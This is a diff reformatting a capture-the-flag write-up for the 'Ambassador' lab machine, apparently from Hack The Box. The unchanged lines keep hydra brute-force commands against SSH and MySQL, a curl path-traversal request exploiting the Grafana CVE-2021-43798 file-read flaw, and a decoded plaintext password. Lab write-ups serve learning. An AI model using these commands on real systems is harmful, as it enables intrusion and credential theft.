@@ -1,4 +1,7 @@
-# Ambassador
+---
+title: "Ambassador"
+---
+
 
 ## Enumeration
 
@@ -33,9 +36,9 @@ Option number 1 brute force ssh with hydra and developer account
 hydra -l developer -P /usr/share/wordlists/rockyou.txt 10.10.11.183 ssh
 ```
 
-{% hint style="danger" %}
+:::danger
 DEAD END
-{% endhint %}
+:::
 
 ## HTTP
 
@@ -91,9 +94,9 @@ DOWNLOADED: 18448 - FOUND: 6
 
 ```
 
-{% hint style="danger" %}
+:::danger
 DEAD END
-{% endhint %}
+:::
 
 ## MYSQL
 
@@ -120,13 +123,13 @@ hydra -l root -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.
 hydra -l developer -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.11.183 mysql
 ```
 
-{% hint style="danger" %}
+:::danger
 DEAD END
-{% endhint %}
+:::
 
 ## Grafana
 
-<mark style="color:red;">Version: v8.2.0</mark> (d7f71e9eae) found a CVE-2021-43798 on that version that affects Grafana 8.0.0-beta1 to 8.3.0
+Version: v8.2.0 (d7f71e9eae) found a CVE-2021-43798 on that version that affects Grafana 8.0.0-beta1 to 8.3.0
 
 ```bash
 curl --path-as-is http://10.10.11.183:3000/public/plugins/alertGroups/../../../../../../../../etc/passwd
@@ -234,7 +237,7 @@ select * from data_source;
 
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+![](../.gitbook/assets/image-1-2.png)
 
 ## Mysql with Grafana user
 
@@ -295,13 +298,13 @@ MySQL [whackywidget]>
 echo -n "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" |base64 -d
 ```
 
-{% hint style="warning" %}
+:::warning
 ```
 password: anEnglishManInNewYork027468
 ```
-{% endhint %}
+:::
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+![](../.gitbook/assets/image-4-1.png)
 
 ## Post exploitation
 
